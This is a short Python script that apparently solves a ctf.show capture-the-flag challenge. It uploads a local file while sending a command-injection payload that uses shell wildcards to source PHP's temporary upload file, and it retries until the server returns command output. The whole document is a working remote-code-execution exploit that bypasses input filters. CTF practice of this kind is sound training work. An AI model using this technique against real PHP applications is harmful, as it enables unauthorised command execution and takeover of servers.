import time
import requests

url = "http://d76a5239-c28d-46e0-b6fa-6ed0410a03ab.challenge.ctf.show/"
payload = {"c":". /???/????????[@-[]"}


with open('.\\1.txt','r') as file:
    files = {'file': file}
    while 1:
        r = requests.post(url,params=payload,files=files)

        if r.text:
            print("\n" + r.text)
            break

        time.sleep(1)
        print(".", end=' ',flush=True)